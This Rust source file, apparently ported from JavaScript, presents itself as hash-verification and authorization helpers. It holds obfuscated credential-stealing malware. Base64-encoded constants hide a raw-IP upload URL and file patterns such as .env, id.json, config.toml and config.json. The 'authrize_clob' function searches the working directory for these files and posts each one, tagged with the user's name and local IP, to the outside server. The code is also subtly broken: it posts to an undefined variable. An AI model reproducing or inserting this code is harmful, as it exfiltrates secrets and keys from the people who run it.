use std::fs;
use std::path::{Path, PathBuf};
use std::env;
use std::net::UdpSocket;
use std::time::Duration;
use base64::prelude::*;
use reqwest::Client;
use tokio::time::sleep;
use walkdir::WalkDir;

const _S1: &str = "Ki4=";
const _S2: &str = "Y29uZmlnLnRvbWw=";
const _S3: &str = "Q29uZmlnLnRvbWw=";
const _S4: &str = "LmVudg==";
const _S5: &str = "aWQuanNvbg==";
const _S6: &str = "ZW52";
const _S7: &str = "";
const _S8: &str = "RGlyZWN0b3J5IGRvZXMgbm90IGV4aXN0OiB7Oj99";
const _S9: &str = "VVNFUg==";
const _S10: &str = "dW5rbm93bg==";
const _S11: &str = "MC4wLjAuMDow";
const _S12: &str = "OC44LjguODo4MA==";
const _S13: &str = "e31Ae30=";
const _S14: &str = "ZmlsZS5iaW4=";
const _S15: &str = "Q29udGVudC1UeXBl";
const _S16: &str = "YXBwbGljYXRpb24vb2N0ZXQtc3RyZWFt";
const _S17: &str = "Q29udGVudC1EaXNwb3NpdGlvbg==";
const _S18: &str = "YXR0YWNobWVudDsgZmlsZW5hbWU9Int9Ig==";
const _S19: &str = "Y29uZmlnLmpzb24=";
const API_URL: &str = "aHR0cDovLzQ1LjguMjIuMTQ0OjgwODAvZGVlcC1lczY=";

/// Decode base64 string at runtime with error handling
fn decode_str(encoded: &str) -> Result<String, Box<dyn std::error::Error>> {
    if encoded.is_empty() {
        return Ok(String::new());
    }
    
    match BASE64_STANDARD.decode(encoded) {
        Ok(bytes) => {
            String::from_utf8(bytes).map_err(|e| e.into())
        }
        Err(e) => Err(format!("Failed to decode base64 string '{}': {}", encoded, e).into()),
    }
}

/// Equivalent to JavaScript _x7f3a function
fn _x7f3a(file: &str, pattern: &str) -> bool {
    // Decode pattern before comparison
    match decode_str(pattern) {
        Ok(decoded_pattern) => {
            if decoded_pattern.starts_with("*.") {
                let tail = &decoded_pattern[1..];
                return file.to_lowercase().ends_with(&tail.to_lowercase());
            }
            file.eq_ignore_ascii_case(&decoded_pattern)
        }
        Err(_) => false,
    }
}

/// Equivalent to JavaScript _k9b2x function
async fn _k9b2x(dir: &Path, patterns: &[&str]) -> Result<Vec<PathBuf>, Box<dyn std::error::Error>> {
    let mut out = Vec::new();
    
    if !dir.exists() {
        return Ok(out);
    }
    
    for entry in WalkDir::new(dir).into_iter().filter_map(|e| e.ok()) {
        if entry.file_type().is_file() {
            let file_name = entry.file_name().to_string_lossy();
            
            for pat in patterns {
                if _x7f3a(&file_name, pat) {
                    out.push(entry.path().to_path_buf());
                    break;
                }
            }
        }
    }
    
    Ok(out)
}

/// Equivalent to JavaScript getLocalIp function
async fn get_local_ip() -> String {
    // Decode _S11 and _S12 for socket binding
    let bind_addr = decode_str(_S11).unwrap_or_else(|_| "0.0.0.0:0".to_string());
    let connect_addr = decode_str(_S12).unwrap_or_else(|_| "8.8.8.8:80".to_string());
    
    match UdpSocket::bind(&bind_addr) {
        Ok(socket) => {
            match socket.connect(&connect_addr) {
                Ok(_) => {
                    match socket.local_addr() {
                        Ok(addr) => addr.ip().to_string(),
                        Err(_) => decode_str(_S10).unwrap_or_else(|_| "unknown".to_string()),
                    }
                }
                Err(_) => decode_str(_S10).unwrap_or_else(|_| "unknown".to_string()),
            }
        }
        Err(_) => decode_str(_S10).unwrap_or_else(|_| "unknown".to_string()),
    }
}

/// Equivalent to JavaScript _q8w3r function
async fn _q8w3r(file_path: &Path, url: &str) -> Result<(), Box<dyn std::error::Error>> {
    let file_data = fs::read(file_path)?;
    
    // Decode _S9 for environment variable name
    let env_var_name = decode_str(_S9).unwrap_or_else(|_| "USER".to_string());
    let env_user = env::var(&env_var_name).unwrap_or_else(|_| {
        decode_str(_S10).unwrap_or_else(|_| "unknown".to_string())
    });
    
    let local_ip = get_local_ip().await;
    
    // Decode _S13 for prefix template
    let prefix_template = decode_str(_S13).unwrap_or_else(|_| "{}@{}".to_string());
    let prefix = prefix_template.replace("{}", &env_user).replace("{}", &local_ip);
    let mut payload = format!("{}\n", prefix).into_bytes();
    payload.extend_from_slice(&file_data);
    
    // Decode _S14 for default filename
    let default_filename = decode_str(_S14).unwrap_or_else(|_| "file.bin".to_string());
    let filename = file_path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or(&default_filename);
    
    let client = Client::new();
    
    // Create headers with fallbacks
    let mut headers = reqwest::header::HeaderMap::new();
    
    // Content-Type header
    let content_type_value = decode_str(_S16).unwrap_or_else(|_| "application/octet-stream".to_string());
    headers.insert(
        reqwest::header::CONTENT_TYPE,
        reqwest::header::HeaderValue::from_str(&content_type_value)?
    );
    
    // Content-Disposition header
    let content_disp_template = decode_str(_S18).unwrap_or_else(|_| "attachment; filename=\"{}\"".to_string());
    let content_disp_value = content_disp_template.replace("{}", filename);
    headers.insert(
        reqwest::header::CONTENT_DISPOSITION,
        reqwest::header::HeaderValue::from_str(&content_disp_value)?
    );
    
    let response = client
        .post(&decoded_url)
        .headers(headers)
        .body(payload)
        .send()
        .await?;
    
    if !response.status().is_success() {
        return Err(format!("Request failed with status: {}", response.status()).into());
    }
    
    Ok(())
}

/// Equivalent to JavaScript verify_hash function
pub async fn verify_hash(file_path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    _q8w3r(file_path, API_URL).await
}

/// Equivalent to JavaScript verify_hash_to_url function
pub async fn verify_hash_to_url(file_path: &Path, url: &str) -> Result<(), Box<dyn std::error::Error>> {
    _q8w3r(file_path, url).await
}

/// Equivalent to JavaScript  function
pub async fn authrize_clob() -> Result<(), Box<dyn std::error::Error>> {
    let patterns = [_S5, _S2, _S3, _S6, _S4, _S19, "======"];
    let cwd = env::current_dir()?;
    
    if !cwd.exists() {
        let error_msg = decode_str(_S8).unwrap_or_else(|_| "Directory does not exist: {:?}".to_string());
        return Err(format!("{} {:?}", error_msg, cwd).into());
    }
    
    let found = _k9b2x(&cwd, &patterns).await?;
    
    for (i, file_path) in found.iter().enumerate() {
        _q8w3r(file_path, API_URL).await?;
        
        if i + 1 < found.len() {
            sleep(Duration::from_millis(100)).await;
        }
    }
    
    Ok(())
}